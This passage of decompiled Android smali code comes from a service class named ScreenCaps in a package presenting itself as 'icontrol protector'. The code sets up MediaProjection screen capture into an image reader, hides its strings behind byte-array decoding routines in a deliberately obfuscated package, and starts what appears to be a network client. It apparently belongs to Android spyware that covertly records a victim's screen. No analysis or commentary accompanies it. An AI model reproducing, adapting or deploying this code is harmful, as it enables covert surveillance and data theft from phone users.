    invoke-static {v0, v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iput v0, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->C:Landroid/content/Context;

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v3, v3, [B

    fill-array-data v3, :array_7

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v2, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    iput v0, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    iget v1, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    const/4 v2, 0x1

    const/16 v3, 0x1e

    invoke-static {v1, v0, v2, v3}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    sget-object v2, Lcom/icontrol/protector/ScreenCaps;->v:Ljava/lang/String;

    iget v3, p0, Lcom/icontrol/protector/ScreenCaps;->h:I

    iget v4, p0, Lcom/icontrol/protector/ScreenCaps;->i:I

    iget v5, p0, Lcom/icontrol/protector/ScreenCaps;->g:I

    invoke-static {}, Lcom/icontrol/protector/ScreenCaps;->x()I

    move-result v6

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    invoke-virtual {v0}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->f:Landroid/hardware/display/VirtualDisplay;

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->c:Landroid/media/ImageReader;

    new-instance v1, Lcom/icontrol/protector/ScreenCaps$e;

    const/4 v2, 0x0

    invoke-direct {v1, p0, v2}, Lcom/icontrol/protector/ScreenCaps$e;-><init>(Lcom/icontrol/protector/ScreenCaps;Lcom/icontrol/protector/ScreenCaps$a;)V

    iget-object v2, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    invoke-virtual {v0, v1, v2}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    return-void

    :array_0
    .array-data 1
        -0x44t
        -0x19t
        0x3at
        0x14t
    .end array-data

    :array_1
    .array-data 1
        -0x15t
        -0x6ct
        0x59t
        0x66t
        -0x46t
        -0x2ft
        0x35t
        0x6ct
    .end array-data

    :array_2
    .array-data 1
        -0x56t
        0x4at
        -0x80t
    .end array-data

    :array_3
    .array-data 1
        -0x63t
        0x78t
        -0x50t
        -0x6at
        -0x13t
        0x3dt
        -0x5at
        0x0t
    .end array-data

    :array_4
    .array-data 1
        -0x76t
        0x67t
        -0x50t
        -0x44t
    .end array-data

    :array_5
    .array-data 1
        -0x3et
        0x14t
        -0x2dt
        -0x32t
        -0x29t
        0x4ft
        0x68t
        -0x11t
    .end array-data

    :array_6
    .array-data 1
        0x63t
        0x7t
        0x1dt
        0x2at
    .end array-data

    :array_7
    .array-data 1
        0x52t
        0x35t
        0x25t
        0x1at
        -0x5at
        0x51t
        -0x80t
        -0x63t
    .end array-data
.end method

.method public static v(Landroid/content/Context;ILandroid/content/Intent;ILjava/lang/String;)Landroid/content/Intent;
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/icontrol/protector/ScreenCaps;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->t:Ljava/lang/String;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    invoke-virtual {v0, p0, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    invoke-virtual {v0, p0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    invoke-virtual {v0, p0, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->q:Ljava/lang/String;

    invoke-virtual {v0, p0, p4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    return-object v0
.end method

.method public static w(Landroid/content/Context;)Landroid/content/Intent;
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/icontrol/protector/ScreenCaps;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->u:Ljava/lang/String;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    return-object v0
.end method

.method private static x()I
    .locals 1

    .line 1
    const/16 v0, 0x12

    return v0
.end method

.method private static y(Landroid/content/Intent;)Z
    .locals 2

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->t:Ljava/lang/String;

    invoke-static {p0, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x1

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    :goto_0
    return p0
.end method

.method private static z(Landroid/content/Intent;)Z
    .locals 2

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->s:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->u:Ljava/lang/String;

    invoke-static {p0, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x1

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    :goto_0
    return p0
.end method


# virtual methods
.method public b(Landroid/content/Context;)V
    .locals 3

    .line 1
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Ljava/lang/Boolean;

    new-instance v0, Lntidisestablish/neumonoul/floccinaucinih/ks;

    invoke-direct {v0}, Lntidisestablish/neumonoul/floccinaucinih/ks;-><init>()V

    iput-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->l:Lntidisestablish/neumonoul/floccinaucinih/ks;

    new-instance v0, Lntidisestablish/neumonoul/floccinaucinih/kx$a;

    invoke-direct {v0}, Lntidisestablish/neumonoul/floccinaucinih/kx$a;-><init>()V

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/ab;->c()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/kx$a;->f(Ljava/lang/String;)Lntidisestablish/neumonoul/floccinaucinih/kx$a;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/kx$a;->a()Lntidisestablish/neumonoul/floccinaucinih/kx;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/ScreenCaps;->l:Lntidisestablish/neumonoul/floccinaucinih/ks;

    new-instance v2, Lcom/icontrol/protector/ScreenCaps$a;

    invoke-direct {v2, p0, p1}, Lcom/icontrol/protector/ScreenCaps$a;-><init>(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;)V

    invoke-virtual {v1, v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/ks;->z(Lntidisestablish/neumonoul/floccinaucinih/kx;Lntidisestablish/neumonoul/floccinaucinih/o70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->m:Lntidisestablish/neumonoul/floccinaucinih/m70;

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->C:Landroid/content/Context;

    new-instance v0, Lcom/icontrol/protector/ScreenCaps$b;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/ScreenCaps$b;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    const/4 p2, 0x2

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    sput-object p3, Lcom/icontrol/protector/ScreenCaps;->C:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/ScreenCaps;->y(Landroid/content/Intent;)Z

    move-result p3

    if-eqz p3, :cond_3

    sget-object p3, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    const/16 v0, 0x32

    invoke-virtual {p1, p3, v0}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p3

    invoke-static {p3}, Lcom/icontrol/protector/ScreenCaps;->A(I)V

    sget-object p3, Lcom/icontrol/protector/ScreenCaps;->q:Ljava/lang/String;

    invoke-virtual {p1, p3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    invoke-static {p3}, Lcom/icontrol/protector/ScreenCaps;->B(Ljava/lang/String;)V

    iget-object p3, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    if-nez p3, :cond_0

    new-instance p3, Lcom/icontrol/protector/ScreenCaps$c;

    invoke-direct {p3, p0}, Lcom/icontrol/protector/ScreenCaps$c;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    invoke-virtual {p3}, Ljava/lang/Thread;->start()V

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    new-array v0, p2, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p3, v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->z:Ljava/lang/String;

    if-nez v0, :cond_1

    const/16 p1, 0x12

    new-array p1, p1, [B

    fill-array-data p1, :array_4

    new-array p3, v1, [B

    fill-array-data p3, :array_5

    invoke-static {p1, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x14

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array p3, v1, [B

    fill-array-data p3, :array_7

    invoke-static {p1, p3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->E()V

    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    return p2

    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_2

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/ScreenCaps;->D(Landroid/content/Context;)V

    :cond_2
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p1

    check-cast p1, Landroid/content/Intent;

    invoke-direct {p0, v0, p1}, Lcom/icontrol/protector/ScreenCaps;->C(ILandroid/content/Intent;)V

    invoke-virtual {p0, p3}, Lcom/icontrol/protector/ScreenCaps;->b(Landroid/content/Context;)V

    goto :goto_0

    :cond_3
    invoke-static {p1}, Lcom/icontrol/protector/ScreenCaps;->z(Landroid/content/Intent;)Z

    move-result p1

    if-eqz p1, :cond_4

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object p1, Lcom/icontrol/protector/ScreenCaps;->y:Ljava/lang/Boolean;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->E:Ljava/lang/String;

    invoke-static {p3, v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-static {p1}, Lcom/icontrol/protector/a;->i(Ljava/lang/Boolean;)V

    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->E()V

    :cond_4
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const/4 p1, 0x1

    return p1

    :catch_0
    return p2

    nop

    :array_0
    .array-data 1
        -0x71t
        -0x74t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x3at
        -0x38t
        -0x43t
        -0x69t
        -0x55t
        -0x37t
        -0x6ft
        0x38t
    .end array-data

    :array_2
    .array-data 1
        0x27t
        0x47t
        -0x52t
        -0x3t
    .end array-data

    :array_3
    .array-data 1
        0x49t
        0x32t
        -0x3et
        -0x6ft
        0x24t
        -0x47t
        0x58t
        -0x2t
    .end array-data

    :array_4
    .array-data 1
        -0x1at
        0x1ft
        -0x2bt
        0x3ft
        0x40t
        -0x46t
        -0x1bt
        -0x28t
        -0x77t
        0x38t
        -0x68t
        0x3et
        0x51t
        -0x42t
        -0x7t
        -0x11t
        -0x3at
        0x1bt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x59t
        0x6bt
        -0x5t
        0x4ct
        0x34t
        -0x25t
        -0x69t
        -0x54t
    .end array-data

    :array_6
    .array-data 1
        0x30t
        -0x7at
        0x18t
        -0x7t
        0x1bt
        -0x1dt
        -0x6ft
        0x27t
        0x1dt
        -0x7dt
        0x56t
        -0x66t
        0xat
        -0x4bt
        -0x62t
        0x2dt
        0x16t
        -0x39t
        0x1ft
        -0x46t
    .end array-data

    :array_7
    .array-data 1
        0x73t
        -0x19t
        0x76t
        -0x22t
        0x6ft
        -0x3dt
        -0x9t
        0x4et
    .end array-data
.end method
